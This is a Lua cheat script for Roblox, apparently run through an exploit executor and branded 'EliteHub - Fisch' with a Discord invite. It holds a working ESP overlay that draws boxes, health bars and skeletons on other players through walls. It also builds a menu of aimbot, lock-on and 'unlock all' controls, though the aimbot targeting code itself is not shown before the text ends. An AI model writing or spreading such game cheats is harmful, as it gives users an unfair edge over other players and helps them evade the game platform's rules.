if getgenv().autoload == nil then getgenv().autoload = true end
if getgenv().autoleave == nil then getgenv().autoleave = true end

local players = game:GetService("Players")
local userInputService = game:GetService("UserInputService")
local coreGui = game:GetService("CoreGui")

local localPlayer = players.LocalPlayer
local espTextGui = Instance.new("ScreenGui")
espTextGui.Name = "ESPTextGui"
espTextGui.IgnoreGuiInset = true -- Fix: Align TextLabel coordinates with Drawing coordinates
pcall(function() espTextGui.Parent = coreGui end)
if not espTextGui.Parent then espTextGui.Parent = localPlayer:WaitForChild("PlayerGui") end

local v1 = game

local function f1()
    local currentCamera = workspace.CurrentCamera
    if not currentCamera then
        currentCamera = workspace:FindFirstChildOfClass("Camera") or workspace.CurrentCamera
    end
    return currentCamera
end

local runService = v1:GetService("RunService")
local color = Color3.fromRGB(255, 0, 0)
local color2 = Color3.fromRGB(0, 0, 0)
local v2 = 200
local q = Enum.KeyCode.Q

local function f2(p1)
    if not p1 then
        return nil, nil
    else
        local v3, v4, v5 = pcall(function() return p1:GetBoundingBox() end)
        if v3 then
            return v4, v5
        end
        return nil, nil
    end
end

local e = Enum.KeyCode.E
local v6 = false
local v7 = false
local v8 = true
local v9 = "Head"
local v10 = false
local highlightEnabled = false
local v11 = {}

local function f3(p2)
    return v11[p2] == true
end

local function f4(p3)
    return p3 and p3.Character or nil
end

local v12 = {}
local v13 = {}
local v14 = 0

local function f5(p4)
    local v15 = f4(p4)
    return v15 and v15:FindFirstChildOfClass("Humanoid") or nil
end

local function f6(p5)
    local v16 = f4(p5)
    if not v16 then
        return nil
    end
    return v16:FindFirstChild(v9) or v16:FindFirstChild("Head") or v16:FindFirstChild("HumanoidRootPart")
end

local function f7(p6)
    local v17 = f5(p6)
    return v17 and v17.Health > 0
end

local function isDamageable(p)
    local character = f4(p)
    if not character then return false end
    if character:FindFirstChildOfClass("ForceField") then return false end
    return true
end

local function f8()
    local esp = {
        box = Drawing.new("Square"),
        healthBg = Drawing.new("Square"),
        healthBar = Drawing.new("Square"),
        healthText = Instance.new("TextLabel"),
        bones = {}
    }
    esp.box.Color = Color3.fromRGB(255, 0, 0)
    esp.box.Thickness = 1.5
    esp.box.Filled = false
    esp.box.Visible = false

    esp.healthBg.Color = Color3.fromRGB(0, 0, 0)
    esp.healthBg.Thickness = 1
    esp.healthBg.Filled = true
    esp.healthBg.Visible = false

    esp.healthBar.Color = Color3.fromRGB(0, 255, 0)
    esp.healthBar.Thickness = 1
    esp.healthBar.Filled = true
    esp.healthBar.Visible = false
    
    esp.healthText.BackgroundTransparency = 1
    esp.healthText.Visible = false
    esp.healthText.Font = Enum.Font.Fondamento
    esp.healthText.TextSize = 12
    esp.healthText.TextColor3 = Color3.fromRGB(255, 255, 255)
    esp.healthText.TextStrokeTransparency = 0
    esp.healthText.AnchorPoint = Vector2.new(1, 0)
    esp.healthText.Size = UDim2.new(0, 50, 0, 10)
    esp.healthText.TextXAlignment = Enum.TextXAlignment.Right
    esp.healthText.TextYAlignment = Enum.TextYAlignment.Top
    esp.healthText.Parent = espTextGui

    for i = 1, 15 do
        local bone = Drawing.new("Line")
        bone.Color = Color3.fromRGB(255, 0, 0)
        bone.Thickness = 1.5
        bone.Visible = false
        table.insert(esp.bones, bone)
    end
    return esp
end

local function f9(p7)
    local v18 = v12[p7]
    if not v18 then return end
    v18.box.Visible = false
    v18.healthBg.Visible = false
    v18.healthBar.Visible = false
    v18.healthText.Visible = false
    for _, bone in ipairs(v18.bones) do bone.Visible = false end
    table.insert(v13, v18)
    v12[p7] = nil
end

local function f10(p8)
    if v12[p8] then
        return v12[p8]
    else
        local v19 = table.remove(v13) or f8()
        v12[p8] = v19
        return v19
    end
end

local function f11(p9)
    local v20, v21, v22
    if p9 == localPlayer or f3(p9) or (p9.Team and localPlayer.Team and p9.Team == localPlayer.Team) then
        f9(p9)
        return
    end
    
    local character = p9.Character
    if not character or not character.Parent or not f7(p9) or not highlightEnabled then
        f9(p9)
        return
    end

    local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")
        if humanoidRootPart2 and (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude > 500 then
            f9(p9)
            return
        end
    end
    
    v21, v20 = f2(character)
    v22 = not v21
    if v22 or not v20 then
        f9(p9)
        return
    end

    local currentCam = f1()
    local rootPart = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")
    if not rootPart then f9(p9); return end

    local pos, onScreen = currentCam:WorldToViewportPoint(v21.Position)
    local esp = f10(p9)

    if not onScreen then
        esp.box.Visible = false
        esp.healthBg.Visible = false
        esp.healthBar.Visible = false
        esp.healthText.Visible = false
        for _, bone in ipairs(esp.bones) do bone.Visible = false end
        return
    end

    local sizeY = currentCam:WorldToViewportPoint(v21.Position + Vector3.new(0, v20.Y/2, 0)).Y - currentCam:WorldToViewportPoint(v21.Position - Vector3.new(0, v20.Y/2, 0)).Y
    local height = math.abs(sizeY)
    local width = math.abs(sizeY / 1.5)
    
    esp.box.Size = Vector2.new(width, height)
    esp.box.Position = Vector2.new(pos.X - width / 2, pos.Y - height / 2)
    esp.box.Visible = true

    local humanoid = f5(p9)
    if humanoid then
        local health = math.clamp(humanoid.Health, 0, humanoid.MaxHealth)
        local maxHealth = humanoid.MaxHealth
        local healthPercent = maxHealth > 0 and (health / maxHealth) or 0
        
        esp.healthBg.Size = Vector2.new(4, height + 2)
        esp.healthBg.Position = Vector2.new(esp.box.Position.X - 6, esp.box.Position.Y - 1)
        esp.healthBg.Visible = true
        
        local healthHeight = height * healthPercent
        esp.healthBar.Size = Vector2.new(2, healthHeight)
        esp.healthBar.Position = Vector2.new(esp.box.Position.X - 5, esp.box.Position.Y + (height - healthHeight))
        esp.healthBar.Color = Color3.fromRGB(255 - (255 * healthPercent), 255 * healthPercent, 0)
        esp.healthBar.Visible = true
        
        esp.healthText.Text = tostring(math.floor(health))
        esp.healthText.Position = UDim2.new(0, esp.healthBar.Position.X - 3, 0, esp.healthBar.Position.Y - 5)
        esp.healthText.TextColor3 = esp.healthBar.Color
        esp.healthText.Visible = true
    else
        esp.healthBg.Visible = false
        esp.healthBar.Visible = false
        esp.healthText.Visible = false
    end

    local bonesData = {
        {"Head", "UpperTorso"}, {"UpperTorso", "LowerTorso"},
        {"UpperTorso", "LeftUpperArm"}, {"LeftUpperArm", "LeftLowerArm"}, {"LeftLowerArm", "LeftHand"},
        {"UpperTorso", "RightUpperArm"}, {"RightUpperArm", "RightLowerArm"}, {"RightLowerArm", "RightHand"},
        {"LowerTorso", "LeftUpperLeg"}, {"LeftUpperLeg", "LeftLowerLeg"}, {"LeftLowerLeg", "LeftFoot"},
        {"LowerTorso", "RightUpperLeg"}, {"RightUpperLeg", "RightLowerLeg"}, {"RightLowerLeg", "RightFoot"}
    }

    if character:FindFirstChild("Torso") then
        bonesData = {
            {"Head", "Torso"}, {"Torso", "Left Arm"}, {"Torso", "Right Arm"},
            {"Torso", "Left Leg"}, {"Torso", "Right Leg"}
        }
    end

    for i, boneName in ipairs(bonesData) do
        local p1 = character:FindFirstChild(boneName[1])
        local p2 = character:FindFirstChild(boneName[2])
        local line = esp.bones[i]
        
        if line and p1 and p2 then
            local pos1, vis1 = currentCam:WorldToViewportPoint(p1.Position)
            local pos2, vis2 = currentCam:WorldToViewportPoint(p2.Position)
            
            if vis1 or vis2 then
                line.From = Vector2.new(pos1.X, pos1.Y)
                line.To = Vector2.new(pos2.X, pos2.Y)
                line.Visible = true
            else
                line.Visible = false
            end
        elseif line then
            line.Visible = false
        end
    end

    for i = #bonesData + 1, #esp.bones do
        if esp.bones[i] then esp.bones[i].Visible = false end
    end
end

local function create(className, properties)
    local inst = Instance.new(className)
    for k, v in pairs(properties) do
        if k ~= "Parent" then inst[k] = v end
    end
    if properties.Parent then inst.Parent = properties.Parent end
    return inst
end

local function applyNeonGradient(parent, c1, c2)
    create("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, c1),
            ColorSequenceKeypoint.new(1, c2)
        }),
        Rotation = 45,
        Parent = parent
    })
    local stroke = create("UIStroke", {
        Color = c1,
        Transparency = 0.2,
        Thickness = 1.2,
        Parent = parent
    })
end

local aimbotUIV2 = create("ScreenGui", {Name = "EliteHub", ResetOnSpawn = false})
pcall(function() aimbotUIV2.Parent = coreGui end)
if not aimbotUIV2.Parent then
    aimbotUIV2.Parent = localPlayer:WaitForChild("PlayerGui")
end

-- Compact Main Window (480x280)
local mainFrame = create("Frame", {
    Size = UDim2.new(0, 480, 0, 280),
    Position = UDim2.new(0.5, -240, 0.5, -140),
    BackgroundColor3 = Color3.fromRGB(12, 12, 15),
    Active = true,
    Draggable = true,
    BorderSizePixel = 0,
    Parent = aimbotUIV2
})
create("UICorner", {CornerRadius = UDim.new(0, 8), Parent = mainFrame})
create("UIStroke", {Color = Color3.fromRGB(0, 255, 200), Transparency = 0.5, Thickness = 1.5, Parent = mainFrame})

-- Topbar
local topbar = create("Frame", {
    Size = UDim2.new(1, 0, 0, 30),
    BackgroundTransparency = 1,
    Parent = mainFrame
})
create("TextLabel", {
    Text = "EliteHub - Fisch (.gg/st8zF5D)",
    Font = Enum.Font.Fondamento,
    TextSize = 11,
    TextColor3 = Color3.fromRGB(0, 255, 200),
    Size = UDim2.new(1, -50, 1, 0),
    Position = UDim2.new(0, 10, 0, 0),
    BackgroundTransparency = 1,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = topbar
})

-- Large & Sleek Corner Minimize Button
local minimizeBtn = create("TextButton", {
    Size = UDim2.new(0, 28, 0, 22),
    Position = UDim2.new(1, -34, 0, 4),
    BackgroundColor3 = Color3.fromRGB(22, 22, 32),
    Text = "—",
    Font = Enum.Font.Fondamento,
    TextSize = 12,
    TextColor3 = Color3.fromRGB(0, 255, 200),
    Parent = topbar
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = minimizeBtn})
create("UIStroke", {Color = Color3.fromRGB(0, 255, 200), Transparency = 0.4, Thickness = 1, Parent = minimizeBtn})

-- Sidebar
local sidebar = create("Frame", {
    Size = UDim2.new(0, 38, 1, -30),
    Position = UDim2.new(0, 0, 0, 30),
    BackgroundColor3 = Color3.fromRGB(18, 18, 22),
    BorderSizePixel = 0,
    Parent = mainFrame
})
create("UICorner", {CornerRadius = UDim.new(0, 8), Parent = sidebar})
create("Frame", {Size = UDim2.new(0, 8, 1, 0), Position = UDim2.new(1, -8, 0, 0), BackgroundColor3 = Color3.fromRGB(18, 18, 22), BorderSizePixel = 0, Parent = sidebar})

-- Content Area
local content = create("Frame", {
    Size = UDim2.new(1, -38, 1, -30),
    Position = UDim2.new(0, 38, 0, 30),
    BackgroundTransparency = 1,
    Parent = mainFrame
})

local dashboardTab = create("Frame", {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Parent = content})
local aimbotTab = create("Frame", {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Visible = false, Parent = content})
local unlockTab = create("Frame", {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Visible = false, Parent = content})
local starTab = create("Frame", {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Visible = false, Parent = content})

local function createSidebarIcon(iconText, yOffset, targetTab)
    local btn = create("TextButton", {
        Size = UDim2.new(1, 0, 0, 28),
        Position = UDim2.new(0, 0, 0, yOffset),
        Text = iconText,
        Font = Enum.Font.Fondamento,
        TextSize = 14,
        TextColor3 = Color3.fromRGB(0, 255, 255),
        BackgroundTransparency = 1,
        Parent = sidebar
    })
    btn.MouseButton1Click:Connect(function()
        dashboardTab.Visible = (targetTab == dashboardTab)
        aimbotTab.Visible = (targetTab == aimbotTab)
        unlockTab.Visible = (targetTab == unlockTab)
        starTab.Visible = (targetTab == starTab)
    end)
    return btn
end

createSidebarIcon("🏠", 5, dashboardTab)
createSidebarIcon("{ }", 33, aimbotTab)
createSidebarIcon("📍", 61, unlockTab)
createSidebarIcon("⭐", 89, starTab)

local thumbUrl = "rbxthumb://type=AvatarHeadShot&id=" .. localPlayer.UserId .. "&w=150&h=150"
local sidebarAvatar = create("ImageLabel", {
    Size = UDim2.new(0, 24, 0, 24),
    Position = UDim2.new(0, 7, 1, -32),
    Image = thumbUrl,
    BackgroundColor3 = Color3.fromRGB(40, 40, 40),
    Parent = sidebar
})
create("UICorner", {CornerRadius = UDim.new(1, 0), Parent = sidebarAvatar})

local miniLogo = create("ImageButton", {
    Size = UDim2.new(0, 44, 0, 44),
    Position = UDim2.new(0.5, -22, 0, 20),
    BackgroundColor3 = Color3.fromRGB(12, 12, 15),
    Image = thumbUrl,
    Active = true,
    Draggable = true,
    Visible = false,
    Parent = aimbotUIV2
})
create("UICorner", {CornerRadius = UDim.new(1, 0), Parent = miniLogo})
create("UIStroke", {Color = Color3.fromRGB(0, 255, 200), Transparency = 0.5, Thickness = 1.5, Parent = miniLogo})

minimizeBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
    miniLogo.Visible = true
end)

miniLogo.MouseButton1Click:Connect(function()
    miniLogo.Visible = false
    mainFrame.Visible = true
end)

-- ==========================================
-- DASHBOARD TAB
-- ==========================================
local function makeMiniBox(parent, text1, text2, x, y, w, h)
    local box = create("Frame", {Parent = parent, Size = UDim2.new(0, w, 0, h), Position = UDim2.new(0, x, 0, y), BackgroundColor3 = Color3.fromRGB(22, 22, 28)})
    create("UICorner", {CornerRadius = UDim.new(0, 5), Parent = box})
    create("UIStroke", {Color = Color3.fromRGB(0, 255, 200), Transparency = 0.7, Thickness = 0.8, Parent = box})
    create("TextLabel", {Parent = box, Text = text1, Font = Enum.Font.Fondamento, TextSize = 10, TextColor3 = Color3.fromRGB(240, 240, 240), Position = UDim2.new(0, 6, 0, 4), BackgroundTransparency = 1, TextXAlignment = "Left"})
    local sub = create("TextLabel", {Parent = box, Text = text2, Font = Enum.Font.Fondamento, TextSize = 8, TextColor3 = Color3.fromRGB(0, 255, 200), Position = UDim2.new(0, 6, 0, 14), BackgroundTransparency = 1, TextXAlignment = "Left"})
    return box, sub
end

local profile = create("Frame", {Size = UDim2.new(1, 0, 0, 42), Position = UDim2.new(0, 8, 0, 6), BackgroundTransparency = 1, Parent = dashboardTab})
local pfp = create("ImageLabel", {Size = UDim2.new(0, 36, 0, 36), Position = UDim2.new(0, 0, 0, 0), Image = thumbUrl, BackgroundColor3 = Color3.fromRGB(40, 40, 40), Parent = profile})
create("UICorner", {CornerRadius = UDim.new(1, 0), Parent = pfp})
create("UIStroke", {Color = Color3.fromRGB(255, 0, 128), Transparency = 0.3, Thickness = 1.2, Parent = pfp})
create("TextLabel", {Text = "Hello, Enjoy", Font = Enum.Font.Fondamento, TextSize = 13, TextColor3 = Color3.fromRGB(255, 255, 255), Position = UDim2.new(0, 44, 0, 3), BackgroundTransparency = 1, TextXAlignment = Enum.TextXAlignment.Left, Parent = profile})
create("TextLabel", {Text = "Enjoy - EliteHub - Fisch", Font = Enum.Font.Fondamento, TextSize = 9, TextColor3 = Color3.fromRGB(0, 255, 200), Position = UDim2.new(0, 44, 0, 18), BackgroundTransparency = 1, TextXAlignment = Enum.TextXAlignment.Left, Parent = profile})

local serverCard = create("Frame", {Size = UDim2.new(0, 205, 0, 185), Position = UDim2.new(0, 8, 0, 52), BackgroundColor3 = Color3.fromRGB(18, 18, 24), Parent = dashboardTab})
create("UICorner", {CornerRadius = UDim.new(0, 6), Parent = serverCard})
applyNeonGradient(serverCard, Color3.fromRGB(0, 150, 100), Color3.fromRGB(20, 20, 25))
create("TextLabel", {Text = "Server Info", Font = Enum.Font.Fondamento, TextSize = 11, TextColor3 = Color3.fromRGB(255, 255, 255), Position = UDim2.new(0, 8, 0, 6), BackgroundTransparency = 1, TextXAlignment = "Left", Parent = serverCard})

local _, playersVal = makeMiniBox(serverCard, "Players", "1 active", 8, 24, 92, 30)
makeMiniBox(serverCard, "Max Players", tostring(players.MaxPlayers), 105, 24, 92, 30)
local _, latencyVal = makeMiniBox(serverCard, "Latency", "Loading...", 8, 58, 92, 30)
makeMiniBox(serverCard, "Region", "US", 105, 58, 92, 30)
local _, timeServerVal = makeMiniBox(serverCard, "Session", "00:00:00", 8, 92, 92, 30)
local _, fpsVal = makeMiniBox(serverCard, "FPS", "Loading...", 105, 92, 92, 30)

local discordBtn = create("TextButton", {
    Size = UDim2.new(0, 189, 0, 28),
    Position = UDim2.new(0, 8, 0, 126),
    BackgroundColor3 = Color3.fromRGB(88, 101, 242),
    Text = "Join Discord (.gg/st8zF5D)",
    Font = Enum.Font.Fondamento,
    TextSize = 9,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Parent = serverCard
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = discordBtn})
discordBtn.MouseButton1Click:Connect(function()
    pcall(function() if setclipboard then setclipboard("https://discord.gg/st8zF5D") end end)
    discordBtn.Text = "Copied Discord Link!"
    task.delay(2, function() discordBtn.Text = "Join Discord (.gg/st8zF5D)" end)
end)

local execName = (identifyexecutor and identifyexecutor()) or "Wave"
local waveCard = create("Frame", {Size = UDim2.new(0, 210, 0, 88), Position = UDim2.new(0, 222, 0, 52), BackgroundColor3 = Color3.fromRGB(24, 18, 24), Parent = dashboardTab})
create("UICorner", {CornerRadius = UDim.new(0, 6), Parent = waveCard})
applyNeonGradient(waveCard, Color3.fromRGB(255, 0, 128), Color3.fromRGB(25, 18, 25))
create("TextLabel", {Text = "Executor: " .. execName, Font = Enum.Font.Fondamento, TextSize = 11, TextColor3 = Color3.fromRGB(255, 100, 180), Position = UDim2.new(0, 8, 0, 6), BackgroundTransparency = 1, TextXAlignment = "Left", Parent = waveCard})
create("TextLabel", {Text = "Supported: Full Neon UI active", Font = Enum.Font.Fondamento, TextSize = 9, TextColor3 = Color3.fromRGB(200, 200, 220), Position = UDim2.new(0, 8, 0, 22), BackgroundTransparency = 1, TextXAlignment = "Left", Parent = waveCard})

local ytBtn = create("TextButton", {
    Size = UDim2.new(0, 194, 0, 28),
    Position = UDim2.new(0, 8, 0, 50),
    BackgroundColor3 = Color3.fromRGB(255, 0, 0),
    Text = "Subscribe to YouTube",
    Font = Enum.Font.Fondamento,
    TextSize = 10,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Parent = waveCard
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = ytBtn})
ytBtn.MouseButton1Click:Connect(function()
    pcall(function() if setclipboard then setclipboard("https://m.youtube.com/@Robloxcinematic-true") end end)
    ytBtn.Text = "Copied YouTube Link!"
    task.delay(2, function() ytBtn.Text = "Subscribe to YouTube" end)
end)

local friendsCard = create("Frame", {Size = UDim2.new(0, 210, 0, 89), Position = UDim2.new(0, 222, 0, 148), BackgroundColor3 = Color3.fromRGB(22, 22, 18), Parent = dashboardTab})
create("UICorner", {CornerRadius = UDim.new(0, 6), Parent = friendsCard})
applyNeonGradient(friendsCard, Color3.fromRGB(255, 200, 0), Color3.fromRGB(22, 22, 18))
create("TextLabel", {Text = "Friends Overview", Font = Enum.Font.Fondamento, TextSize = 11, TextColor3 = Color3.fromRGB(255, 230, 100), Position = UDim2.new(0, 8, 0, 6), BackgroundTransparency = 1, TextXAlignment = "Left", Parent = friendsCard})

local _, onlineVal = makeMiniBox(friendsCard, "Online", "Loading...", 8, 24, 92, 28)
local _, offlineVal = makeMiniBox(friendsCard, "Offline", "Loading...", 108, 24, 92, 28)
local _, inServerVal = makeMiniBox(friendsCard, "In Server", "Loading...", 8, 56, 92, 28)
local _, totalVal = makeMiniBox(friendsCard, "Total", "Loading...", 108, 56, 92, 28)

task.spawn(function()
    local inServerCount = 0
    for _, p in ipairs(players:GetPlayers()) do
        if p ~= localPlayer and localPlayer:IsFriendsWith(p.UserId) then
            inServerCount = inServerCount + 1
        end
    end
    inServerVal.Text = tostring(inServerCount) .. " friends"

    local s, onlineFriendsData = pcall(function() return localPlayer:GetFriendsOnline(200) end)
    local onlineCount = (s and type(onlineFriendsData) == "table") and #onlineFriendsData or 0
    onlineVal.Text = tostring(onlineCount) .. " friends"

    local totalCount = 0
    local fetchSuccess, result = pcall(function()
        if game.HttpGet then
            local url = "https://friends.roblox.com/v1/users/" .. localPlayer.UserId .. "/friends/count"
            local response = game:HttpGet(url)
            local data = game:GetService("HttpService"):JSONDecode(response)
            return data.count
        end
        return nil
    end)

    if fetchSuccess and result then
        totalCount = tonumber(result) or 0
        totalVal.Text = tostring(totalCount) .. " friends"
        offlineVal.Text = tostring(math.max(0, totalCount - onlineCount)) .. " friends"
    else
        totalVal.Text = "N/A"
        offlineVal.Text = "N/A"
    end
end)

task.spawn(function()
    local startTick = tick()
    local stats = game:GetService("Stats")
    local frames = 0
    local lastTick = tick()
    
    runService.RenderStepped:Connect(function()
        frames = frames + 1
    end)
    
    while task.wait(1) do
        if not timeServerVal then break end
        local currentTick = tick()
        local diff = currentTick - startTick
        local h = math.floor(diff / 3600)
        local m = math.floor((diff % 3600) / 60)
        local s = math.floor(diff % 60)
        timeServerVal.Text = string.format("%02d:%02d:%02d", h, m, s)
        playersVal.Text = tostring(#players:GetPlayers()) .. " active"
        
        local fps = math.floor(frames / (currentTick - lastTick))
        if fpsVal then fpsVal.Text = tostring(fps) .. " FPS" end
        frames = 0
        lastTick = currentTick
        
        pcall(function()
            local pingStr = stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
            local pingMatch = pingStr:match("%d+")
            if pingMatch and latencyVal then
                latencyVal.Text = pingMatch .. " ms"
            end
        end)
    end
end)


-- ==========================================
-- AIMBOT TAB ({ } Clean Card Layout)
-- ==========================================
create("TextLabel", {
    Text = "{ } Aimbot & Target Settings",
    Font = Enum.Font.Fondamento,
    TextSize = 13,
    TextColor3 = Color3.fromRGB(0, 255, 200),
    Position = UDim2.new(0, 10, 0, 6),
    BackgroundTransparency = 1,
    TextXAlignment = "Left",
    Parent = aimbotTab
})

-- Left Card: Aimbot Controls
local aimbotCard = create("Frame", {
    Size = UDim2.new(0, 205, 0, 215),
    Position = UDim2.new(0, 8, 0, 30),
    BackgroundColor3 = Color3.fromRGB(18, 18, 24),
    Parent = aimbotTab
})
create("UICorner", {CornerRadius = UDim.new(0, 6), Parent = aimbotCard})
applyNeonGradient(aimbotCard, Color3.fromRGB(0, 180, 200), Color3.fromRGB(20, 20, 25))

create("TextLabel", {
    Text = "Configuration",
    Font = Enum.Font.Fondamento,
    TextSize = 11,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Position = UDim2.new(0, 8, 0, 6),
    BackgroundTransparency = 1,
    TextXAlignment = "Left",
    Parent = aimbotCard
})

local instance3 = create("TextButton", {
    Size = UDim2.new(0, 189, 0, 28),
    Position = UDim2.new(0, 8, 0, 26),
    Text = "Aimbot: OFF (Q)",
    Font = Enum.Font.Fondamento,
    TextSize = 10,
    BackgroundColor3 = Color3.fromRGB(180, 40, 60),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Parent = aimbotCard
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = instance3})

local instance4 = create("TextButton", {
    Size = UDim2.new(0, 189, 0, 26),
    Position = UDim2.new(0, 8, 0, 58),
    Text = "Strong Lock: OFF",
    Font = Enum.Font.Fondamento,
    TextSize = 10,
    BackgroundColor3 = Color3.fromRGB(180, 40, 60),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Parent = aimbotCard
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = instance4})

local instance5 = create("TextButton", {
    Size = UDim2.new(0, 189, 0, 26),
    Position = UDim2.new(0, 8, 0, 88),
    Text = "Wallcheck: ON",
    Font = Enum.Font.Fondamento,
    TextSize = 10,
    BackgroundColor3 = Color3.fromRGB(0, 180, 100),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Parent = aimbotCard
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = instance5})

local instance6 = create("TextButton", {
    Size = UDim2.new(0, 189, 0, 26),
    Position = UDim2.new(0, 8, 0, 118),
    Text = "Aim: Head",
    Font = Enum.Font.Fondamento,
    TextSize = 10,
    BackgroundColor3 = Color3.fromRGB(45, 45, 60),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Parent = aimbotCard
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = instance6})

local fovContainer = create("Frame", {
    Size = UDim2.new(0, 189, 0, 28),
    Position = UDim2.new(0, 8, 0, 148),
    BackgroundColor3 = Color3.fromRGB(14, 14, 20),
    Parent = aimbotCard
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = fovContainer})
create("UIStroke", {Color = Color3.fromRGB(0, 255, 200), Transparency = 0.6, Thickness = 0.8, Parent = fovContainer})

create("TextLabel", {
    Text = "FOV Radius:",
    Font = Enum.Font.Fondamento,
    TextSize = 9,
    TextColor3 = Color3.fromRGB(180, 180, 200),
    Size = UDim2.new(0, 75, 1, 0),
    Position = UDim2.new(0, 8, 0, 0),
    BackgroundTransparency = 1,
    TextXAlignment = "Left",
    Parent = fovContainer
})

local instance8 = create("TextBox", {
    Size = UDim2.new(0, 95, 1, -6),
    Position = UDim2.new(0, 86, 0, 3),
    PlaceholderText = tostring(v2),
    Text = tostring(v2),
    Font = Enum.Font.Fondamento,
    TextSize = 10,
    BackgroundColor3 = Color3.fromRGB(24, 24, 32),
    TextColor3 = Color3.fromRGB(0, 255, 200),
    Parent = fovContainer
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = instance8})

local highlightBtn = create("TextButton", {
    Size = UDim2.new(0, 189, 0, 26),
    Position = UDim2.new(0, 8, 0, 178),
    Text = "Highlight: OFF",
    Font = Enum.Font.Fondamento,
    TextSize = 10,
    BackgroundColor3 = Color3.fromRGB(180, 40, 60),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Parent = aimbotCard
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = highlightBtn})

highlightBtn.MouseButton1Click:Connect(function()
    highlightEnabled = not highlightEnabled
    highlightBtn.Text = "Highlight: " .. (highlightEnabled and "ON" or "OFF")
    highlightBtn.BackgroundColor3 = highlightEnabled and Color3.fromRGB(0, 180, 100) or Color3.fromRGB(180, 40, 60)
    if not highlightEnabled then
        for _, p in ipairs(players:GetPlayers()) do
            f9(p)
        end
    end
end)

-- Right Card: Target Status & Player Exclusion
local targetCard = create("Frame", {
    Size = UDim2.new(0, 210, 0, 215),
    Position = UDim2.new(0, 222, 0, 30),
    BackgroundColor3 = Color3.fromRGB(24, 18, 24),
    Parent = aimbotTab
})
create("UICorner", {CornerRadius = UDim.new(0, 6), Parent = targetCard})
applyNeonGradient(targetCard, Color3.fromRGB(255, 0, 128), Color3.fromRGB(25, 18, 25))

create("TextLabel", {
    Text = "Target & Exclusions",
    Font = Enum.Font.Fondamento,
    TextSize = 11,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Position = UDim2.new(0, 8, 0, 6),
    BackgroundTransparency = 1,
    TextXAlignment = "Left",
    Parent = targetCard
})

local targetStatusBox = create("Frame", {
    Size = UDim2.new(0, 194, 0, 28),
    Position = UDim2.new(0, 8, 0, 26),
    BackgroundColor3 = Color3.fromRGB(14, 14, 20),
    Parent = targetCard
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = targetStatusBox})
create("UIStroke", {Color = Color3.fromRGB(255, 0, 128), Transparency = 0.6, Thickness = 0.8, Parent = targetStatusBox})

local instance7 = create("TextLabel", {
    Size = UDim2.new(1, -12, 1, 0),
    Position = UDim2.new(0, 8, 0, 0),
    BackgroundTransparency = 1,
    Text = "Aimed: None",
    Font = Enum.Font.Fondamento,
    TextSize = 10,
    TextColor3 = Color3.fromRGB(0, 255, 200),
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = targetStatusBox
})

local instance9 = create("TextLabel", {
    Size = UDim2.new(0, 194, 0, 18),
    Position = UDim2.new(0, 8, 0, 58),
    Text = "Exclude: 0",
    Font = Enum.Font.Fondamento,
    TextSize = 10,
    TextColor3 = Color3.fromRGB(255, 200, 100),
    BackgroundTransparency = 1,
    TextXAlignment = "Left",
    Parent = targetCard
})

local instance10 = create("Frame", {
    Size = UDim2.new(0, 194, 0, 125),
    Position = UDim2.new(0, 8, 0, 78),
    BackgroundColor3 = Color3.fromRGB(14, 14, 20),
    Parent = targetCard
})
create("UICorner", {CornerRadius = UDim.new(0, 5), Parent = instance10})
create("UIStroke", {Color = Color3.fromRGB(255, 0, 128), Transparency = 0.7, Thickness = 0.8, Parent = instance10})

local instance11 = create("ScrollingFrame", {
    Size = UDim2.new(1, -8, 1, -8),
    Position = UDim2.new(0, 4, 0, 4),
    BackgroundTransparency = 1,
    CanvasSize = UDim2.new(0, 0, 0, 0),
    ScrollBarThickness = 3,
    ScrollBarImageColor3 = Color3.fromRGB(0, 255, 200),
    Parent = instance10
})
local instance12 = create("UIListLayout", {
    Padding = UDim.new(0, 3),
    SortOrder = Enum.SortOrder.LayoutOrder,
    Parent = instance11
})


-- ==========================================
-- UNLOCK TAB (📍 Option Integration)
-- ==========================================
create("TextLabel", {Text = "Unlock All & Features", Font = Enum.Font.Fondamento, TextSize = 14, TextColor3 = Color3.fromRGB(0, 255, 200), Position = UDim2.new(0, 10, 0, 10), BackgroundTransparency = 1, TextXAlignment = "Left", Parent = unlockTab})

local unlockCard = create("Frame", {Size = UDim2.new(0, 210, 0, 170), Position = UDim2.new(0, 10, 0, 36), BackgroundColor3 = Color3.fromRGB(18, 18, 24), Parent = unlockTab})
create("UICorner", {CornerRadius = UDim.new(0, 6), Parent = unlockCard})
applyNeonGradient(unlockCard, Color3.fromRGB(0, 180, 100), Color3.fromRGB(20, 20, 25))

